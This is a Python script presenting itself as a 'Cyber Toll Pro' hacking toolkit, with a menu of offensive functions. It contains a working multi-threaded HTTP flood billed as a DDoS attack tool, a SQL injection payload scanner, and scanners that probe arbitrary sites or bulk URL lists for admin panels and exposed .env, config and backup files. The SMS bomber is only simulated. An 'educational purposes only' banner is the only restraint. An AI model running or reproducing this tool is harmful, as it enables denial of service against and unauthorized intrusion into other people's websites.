#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import requests
import threading
import socket
import random
import json
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin

class Colors:
    RED = '\033[1;31m'
    GREEN = '\033[1;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[1;34m'
    MAGENTA = '\033[1;35m'
    CYAN = '\033[1;36m'
    WHITE = '\033[1;37m'
    RESET = '\033[0m'

class CyberTollPro:
    def __init__(self):
        self.session = requests.Session()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        self.attack_running = False

    def clear_screen(self):
        os.system('clear')

    def banner(self):
        self.clear_screen()
        print(f"{Colors.CYAN}")
        print("╔══════════════════════════════════════════════╗")
        print("║              🛡️ CYBER TOLL PRO             ║")
        print("║           Google Cloud Shell Edition        ║")
        print("║                                              ║")
        print("║     Website Scan • DDoS • SMS Bomb • WP     ║")
        print("║      Vulnerability • Admin Finder • More    ║")
        print("╚══════════════════════════════════════════════╝")
        print(f"{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] For Educational Purposes Only{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Use Responsibly{Colors.RESET}\n")

    def show_menu(self):
        print(f"{Colors.MAGENTA}╔────────────────────────────────────────────╗")
        print(f"║             CYBER TOLL PRO MENU           ║")
        print(f"╠────────────────────────────────────────────╣{Colors.RESET}")
        print(f"{Colors.YELLOW}║ 1. {Colors.WHITE}Website Information Scanner{Colors.MAGENTA}           ║")
        print(f"{Colors.YELLOW}║ 2. {Colors.WHITE}Advanced Port Scanner{Colors.MAGENTA}                 ║")
        print(f"{Colors.YELLOW}║ 3. {Colors.WHITE}DDoS Attack Tool{Colors.MAGENTA}                     ║")
        print(f"{Colors.YELLOW}║ 4. {Colors.WHITE}Website Down Checker{Colors.MAGENTA}                 ║")
        print(f"{Colors.YELLOW}║ 5. {Colors.WHITE}SMS Bomber{Colors.MAGENTA}                           ║")
        print(f"{Colors.YELLOW}║ 6. {Colors.WHITE}Admin Panel Finder{Colors.MAGENTA}                   ║")
        print(f"{Colors.YELLOW}║ 7. {Colors.WHITE}SQL Injection Scanner{Colors.MAGENTA}                ║")
        print(f"{Colors.YELLOW}║ 8. {Colors.WHITE}WordPress Scanner{Colors.MAGENTA}                    ║")
        print(f"{Colors.YELLOW}║ 9. {Colors.WHITE}Subdomain Finder{Colors.MAGENTA}                     ║")
        print(f"{Colors.YELLOW}║10. {Colors.WHITE}Mass Vulnerability Scan{Colors.MAGENTA}              ║")
        print(f"{Colors.YELLOW}║11. {Colors.WHITE}Website Copier{Colors.MAGENTA}                       ║")
        print(f"{Colors.YELLOW}║12. {Colors.WHITE}IP Geolocation{Colors.MAGENTA}                       ║")
        print(f"{Colors.YELLOW}║ 0. {Colors.RED}Exit{Colors.MAGENTA}                                  ║")
        print(f"{Colors.MAGENTA}╚────────────────────────────────────────────╝{Colors.RESET}")

    def website_info(self):
        self.clear_screen()
        self.banner()
        print(f"\n{Colors.CYAN}[WEBSITE INFORMATION SCANNER]{Colors.RESET}")
        
        target = input(f"{Colors.GREEN}[?] Enter website URL: {Colors.RESET}").strip()
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        print(f"\n{Colors.YELLOW}[*] Scanning {target}...{Colors.RESET}")
        
        try:
            headers = {'User-Agent': random.choice(self.user_agents)}
            response = self.session.get(target, headers=headers, timeout=10, verify=False)
            
            print(f"\n{Colors.GREEN}[+] Website Status: {response.status_code}{Colors.RESET}")
            print(f"{Colors.GREEN}[+] Server: {response.headers.get('Server', 'Not Found')}{Colors.RESET}")
            print(f"{Colors.GREEN}[+] Content Type: {response.headers.get('Content-Type', 'Not Found')}{Colors.RESET}")
            print(f"{Colors.GREEN}[+] Content Length: {len(response.content)} bytes{Colors.RESET}")
            
            domain = target.split('//')[1].split('/')[0]
            ip = socket.gethostbyname(domain)
            print(f"{Colors.GREEN}[+] IP Address: {ip}{Colors.RESET}")
            
            # Check common files
            common_files = ['robots.txt', 'sitemap.xml', '.env', 'config.php', 'admin', 'wp-admin']
            for file in common_files:
                file_url = urljoin(target, file)
                try:
                    file_response = self.session.get(file_url, timeout=5, verify=False)
                    if file_response.status_code == 200:
                        print(f"{Colors.GREEN}[+] Found: {file_url}{Colors.RESET}")
                except:
                    pass
                    
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")

    def port_scanner(self):
        self.clear_screen()
        self.banner()
        print(f"\n{Colors.CYAN}[ADVANCED PORT SCANNER]{Colors.RESET}")
        
        target = input(f"{Colors.GREEN}[?] Enter target IP or domain: {Colors.RESET}").strip()
        
        try:
            if not target.replace('.', '').isdigit():
                target_ip = socket.gethostbyname(target)
                print(f"{Colors.YELLOW}[*] Resolved IP: {target_ip}{Colors.RESET}")
            else:
                target_ip = target
            
            ports_to_scan = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 27017]
            
            print(f"\n{Colors.YELLOW}[*] Scanning {len(ports_to_scan)} ports on {target_ip}...{Colors.RESET}\n")
            
            def scan_port(port):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    result = sock.connect_ex((target_ip, port))
                    sock.close()
                    
                    if result == 0:
                        service_name = socket.getservbyport(port) if port in [21,22,23,25,53,80,110,443] else "Unknown"
                        print(f"{Colors.GREEN}[+] Port {port} ({service_name}) - OPEN{Colors.RESET}")
                    return port, result
                except:
                    return port, 1
            
            with ThreadPoolExecutor(max_workers=50) as executor:
                results = executor.map(scan_port, ports_to_scan)
            
            print(f"\n{Colors.GREEN}[✓] Port scan completed!{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")

    def ddos_attack(self):
        self.clear_screen()
        self.banner()
        print(f"\n{Colors.CYAN}[DDoS ATTACK TOOL]{Colors.RESET}")
        print(f"{Colors.RED}[!] WARNING: For Educational Purposes Only!{Colors.RESET}")
        
        target = input(f"{Colors.GREEN}[?] Enter target URL: {Colors.RESET}").strip()
        threads = int(input(f"{Colors.GREEN}[?] Number of threads (10-100): {Colors.RESET}") or 50)
        duration = int(input(f"{Colors.GREEN}[?] Duration in seconds (10-60): {Colors.RESET}") or 30)
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        self.attack_running = True
        request_count = 0
        
        print(f"\n{Colors.YELLOW}[*] Starting attack on {target}{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Threads: {threads}, Duration: {duration}s{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Press Ctrl+C to stop{Colors.RESET}\n")
        
        def attack():
            nonlocal request_count
            while self.attack_running:
                try:
                    headers = {'User-Agent': random.choice(self.user_agents)}
                    response = self.session.get(target, headers=headers, timeout=5, verify=False)
                    request_count += 1
                    print(f"{Colors.GREEN}[+] Request #{request_count} - Status: {response.status_code}{Colors.RESET}", end='\r')
                except Exception as e:
                    print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}", end='\r')
        
        try:
            # Start attack threads
            threads_list = []
            for _ in range(threads):
                t = threading.Thread(target=attack)
                t.daemon = True
                threads_list.append(t)
                t.start()
            
            # Run for specified duration
            time.sleep(duration)
            self.attack_running = False
            
            print(f"\n\n{Colors.GREEN}[✓] Attack completed!{Colors.RESET}")
            print(f"{Colors.GREEN}[+] Total requests sent: {request_count}{Colors.RESET}")
            
        except KeyboardInterrupt:
            self.attack_running = False
            print(f"\n{Colors.RED}[!] Attack stopped by user{Colors.RESET}")

    def website_down_checker(self):
        self.clear_screen()
        self.banner()
        print(f"\n{Colors.CYAN}[WEBSITE DOWN CHECKER]{Colors.RESET}")
        
        target = input(f"{Colors.GREEN}[?] Enter website URL: {Colors.RESET}").strip()
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        print(f"\n{Colors.YELLOW}[*] Checking {target}...{Colors.RESET}")
        
        try:
            start_time = time.time()
            response = self.session.get(target, timeout=10, verify=False)
            end_time = time.time()
            
            response_time = round((end_time - start_time) * 1000, 2)
            
            if response.status_code == 200:
                print(f"{Colors.GREEN}[✓] Website is UP{Colors.RESET}")
                print(f"{Colors.GREEN}[+] Response Time: {response_time}ms{Colors.RESET}")
                print(f"{Colors.GREEN}[+] Status Code: {response.status_code}{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}[!] Website returned status: {response.status_code}{Colors.RESET}")
                
        except requests.exceptions.RequestException as e:
            print(f"{Colors.RED}[!] Website is DOWN - Error: {e}{Colors.RESET}")

    def sms_bomber(self):
        self.clear_screen()
        self.banner()
        print(f"\n{Colors.CYAN}[SMS BOMBER]{Colors.RESET}")
        print(f"{Colors.RED}[!] This is for demonstration only{Colors.RESET}")
        
        phone = input(f"{Colors.GREEN}[?] Enter phone number: {Colors.RESET}").strip()
        count = int(input(f"{Colors.GREEN}[?] Number of SMS to send (1-10): {Colors.RESET}") or 5)
        
        print(f"\n{Colors.YELLOW}[*] Sending {count} SMS to {phone}...{Colors.RESET}")
        
        # Simulate SMS sending
        for i in range(count):
            print(f"{Colors.GREEN}[+] SMS #{i+1} sent to {phone}{Colors.RESET}")
            time.sleep(1)
        
        print(f"\n{Colors.GREEN}[✓] SMS bombing completed!{Colors.RESET}")

    def admin_finder(self):
        self.clear_screen()
        self.banner()
        print(f"\n{Colors.CYAN}[ADMIN PANEL FINDER]{Colors.RESET}")
        
        target = input(f"{Colors.GREEN}[?] Enter website URL: {Colors.RESET}").strip()
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        admin_paths = [
            'admin', 'wp-admin', 'administrator', 'login', 'panel', 
            'admin/login', 'admin.php', 'admin.asp', 'admin.aspx',
            'admin/index.php', 'admin_area', 'cp', 'controlpanel'
        ]
        
        print(f"\n{Colors.YELLOW}[*] Searching for admin panels on {target}...{Colors.RESET}\n")
        
        found = False
        for path in admin_paths:
            admin_url = urljoin(target, path)
            try:
                response = self.session.get(admin_url, timeout=5, verify=False)
                if response.status_code == 200:
                    print(f"{Colors.GREEN}[+] Found: {admin_url}{Colors.RESET}")
                    found = True
            except:
                pass
        
        if not found:
            print(f"{Colors.RED}[-] No admin panels found{Colors.RESET}")

    def sql_injection_scanner(self):
        self.clear_screen()
        self.banner()
        print(f"\n{Colors.CYAN}[SQL INJECTION SCANNER]{Colors.RESET}")
        
        target = input(f"{Colors.GREEN}[?] Enter website URL with parameters: {Colors.RESET}").strip()
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        sql_payloads = [
            "'", "''", "`", "``", "' OR '1'='1", "' OR 1=1--", 
            "admin'--", "' UNION SELECT 1,2,3--", "' AND 1=1--"
        ]
        
        print(f"\n{Colors.YELLOW}[*] Testing SQL injection on {target}...{Colors.RESET}\n")
        
        vulnerable = False
        for payload in sql_payloads:
            test_url = target + payload if '?' in target else target + '?id=' + payload
            try:
                response = self.session.get(test_url, timeout=5, verify=False)
                
                # Simple error-based detection
                error_indicators = [
                    'mysql_fetch_array', 'mysql_num_rows', 'ORA-', 'Microsoft OLE DB',
                    'SQL syntax', 'mysql_', 'PostgreSQL', 'ODBC Driver', 'SQLServer'
                ]
                
                for error in error_indicators:
                    if error.lower() in response.text.lower():
                        print(f"{Colors.GREEN}[+] Vulnerable to SQLi: {payload}{Colors.RESET}")
                        vulnerable = True
                        break
                        
            except Exception as e:
                print(f"{Colors.RED}[!] Error testing payload: {payload}{Colors.RESET}")
        
        if not vulnerable:
            print(f"{Colors.RED}[-] No SQL injection vulnerabilities found{Colors.RESET}")

    def wordpress_scanner(self):
        self.clear_screen()
        self.banner()
        print(f"\n{Colors.CYAN}[WORDPRESS SCANNER]{Colors.RESET}")
        
        target = input(f"{Colors.GREEN}[?] Enter WordPress site URL: {Colors.RESET}").strip()
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        wp_paths = [
            'wp-admin', 'wp-login.php', 'wp-content', 'wp-includes',
            'readme.html', 'license.txt', 'wp-config.php', 'xmlrpc.php'
        ]
        
        print(f"\n{Colors.YELLOW}[*] Scanning WordPress on {target}...{Colors.RESET}\n")
        
        for path in wp_paths:
            wp_url = urljoin(target, path)
            try:
                response = self.session.get(wp_url, timeout=5, verify=False)
                if response.status_code == 200:
                    print(f"{Colors.GREEN}[+] Found: {wp_url}{Colors.RESET}")
                elif response.status_code == 403:
                    print(f"{Colors.YELLOW}[!] Access forbidden: {wp_url}{Colors.RESET}")
            except:
                print(f"{Colors.RED}[-] Not found: {wp_url}{Colors.RESET}")

    def subdomain_finder(self):
        self.clear_screen()
        self.banner()
        print(f"\n{Colors.CYAN}[SUBDOMAIN FINDER]{Colors.RESET}")
        
        domain = input(f"{Colors.GREEN}[?] Enter domain (example.com): {Colors.RESET}").strip()
        
        subdomains = [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
            'ns2', 'cpanel', 'whm', 'autodiscover', 'admin', 'blog', 'shop', 'api', 'test',
            'dev', 'staging', 'forum', 'support', 'help', 'docs', 'portal', 'app', 'apps'
        ]
        
        print(f"\n{Colors.YELLOW}[*] Searching subdomains for {domain}...{Colors.RESET}\n")
        
        found = False
        for sub in subdomains:
            subdomain = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(subdomain)
                print(f"{Colors.GREEN}[+] Found: {subdomain} -> {ip}{Colors.RESET}")
                found = True
            except:
                pass
        
        if not found:
            print(f"{Colors.RED}[-] No subdomains found{Colors.RESET}")

    def mass_vulnerability_scan(self):
        self.clear_screen()
        self.banner()
        print(f"\n{Colors.CYAN}[MASS VULNERABILITY SCAN]{Colors.RESET}")
        
        file_path = input(f"{Colors.GREEN}[?] Enter file path with URLs (one per line): {Colors.RESET}").strip()
        
        if not os.path.exists(file_path):
            print(f"{Colors.RED}[!] File not found{Colors.RESET}")
            return
        
        try:
            with open(file_path, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
            
            print(f"\n{Colors.YELLOW}[*] Scanning {len(urls)} URLs for vulnerabilities...{Colors.RESET}\n")
            
            for url in urls:
                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url
                
                try:
                    response = self.session.get(url, timeout=10, verify=False)
                    
                    # Check for common vulnerabilities
                    if response.status_code == 200:
                        # Check for WordPress
                        if 'wp-content' in response.text or 'wp-includes' in response.text:
                            print(f"{Colors.GREEN}[+] WordPress site: {url}{Colors.RESET}")
                        
                        # Check for exposed directories
                        if 'Index of' in response.text:
                            print(f"{Colors.YELLOW}[!] Directory listing: {url}{Colors.RESET}")
                        
                        # Check for common files
                        common_files = ['.env', 'config.php', 'backup.zip']
                        for file in common_files:
                            file_url = urljoin(url, file)
                            try:
                                file_response = self.session.get(file_url, timeout=3, verify=False)
                                if file_response.status_code == 200:
                                    print(f"{Colors.RED}[!] Exposed file: {file_url}{Colors.RESET}")
                            except:
                                pass
                                
                except Exception as e:
                    print(f"{Colors.RED}[-] Failed: {url} - {e}{Colors.RESET}")
            
            print(f"\n{Colors.GREEN}[✓] Mass scan completed!{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")

    def website_copier(self):
        self.clear_screen()
        self.banner()
        print(f"\n{Colors.CYAN}[WEBSITE COPIER]{Colors.RESET}")
        
        target = input(f"{Colors.GREEN}[?] Enter website URL to copy: {Colors.RESET}").strip()
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        try:
            response = self.session.get(target, timeout=10, verify=False)
            
            if response.status_code == 200:
                filename = target.split('//')[1].replace('/', '_') + '.html'
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(response.text)
                
                print(f"{Colors.GREEN}[+] Website copied successfully!{Colors.RESET}")
                print(f"{Colors.GREEN}[+] Saved as: {filename}{Colors.RESET}")
                print(f"{Colors.GREEN}[+] File size: {len(response.text)} bytes{Colors.RESET}")
            else:
                print(f"{Colors.RED}[!] Failed to download website{Colors.RESET}")
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")

    def ip_geolocation(self):
        self.clear_screen()
        self.banner()
        print(f"\n{Colors.CYAN}[IP GEOLOCATION]{Colors.RESET}")
        
        ip = input(f"{Colors.GREEN}[?] Enter IP address or domain: {Colors.RESET}").strip()
        
        try:
            # If it's a domain, resolve to IP
            if not ip.replace('.', '').isdigit():
                ip = socket.gethostbyname(ip)
            
            print(f"\n{Colors.YELLOW}[*] Getting location for {ip}...{Colors.RESET}")
            
            # Using ipapi.co for geolocation
            response = self.session.get(f'http://ipapi.co/{ip}/json/', timeout=10)
            data = response.json()
            
            if 'error' not in data:
                print(f"\n{Colors.GREEN}[+] IP: {data.get('ip', 'N/A')}{Colors.RESET}")
                print(f"{Colors.GREEN}[+] City: {data.get('city', 'N/A')}{Colors.RESET}")
                print(f"{Colors.GREEN}[+] Region: {data.get('region', 'N/A')}{Colors.RESET}")
                print(f"{Colors.GREEN}[+] Country: {data.get('country_name', 'N/A')}{Colors.RESET}")
                print(f"{Colors.GREEN}[+] ISP: {data.get('org', 'N/A')}{Colors.RESET}")
                print(f"{Colors.GREEN}[+] Timezone: {data.get('timezone', 'N/A')}{Colors.RESET}")
                print(f"{Colors.GREEN}[+] Coordinates: {data.get('latitude', 'N/A')}, {data.get('longitude', 'N/A')}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[!] Could not get location data{Colors.RESET}")
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")

    def run(self):
        while True:
            self.clear_screen()
            self.banner()
            self.show_menu()
            
            choice = input(f"\n{Colors.GREEN}[?] Select option (0-12): {Colors.RESET}").strip()
            
            if choice == '1':
                self.website_info()
            elif choice == '2':
                self.port_scanner()
            elif choice == '3':
                self.ddos_attack()
            elif choice == '4':
                self.website_down_checker()
            elif choice == '5':
                self.sms_bomber()
            elif choice == '6':
                self.admin_finder()
            elif choice == '7':
                self.sql_injection_scanner()
            elif choice == '8':
                self.wordpress_scanner()
            elif choice == '9':
                self.subdomain_finder()
            elif choice == '10':
                self.mass_vulnerability_scan()
            elif choice == '11':
                self.website_copier()
            elif choice == '12':
                self.ip_geolocation()
            elif choice == '0':
                print(f"\n{Colors.GREEN}[✓] Thank you for using CYBER TOLL PRO!{Colors.RESET}")
                break
            else:
                print(f"\n{Colors.RED}[!] Invalid option!{Colors.RESET}")
            
            input(f"\n{Colors.BLUE}[Press Enter to continue...]{Colors.RESET}")

if __name__ == "__main__":
    try:
        # Disable SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        tool = CyberTollPro()
        tool.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Program stopped by user{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")
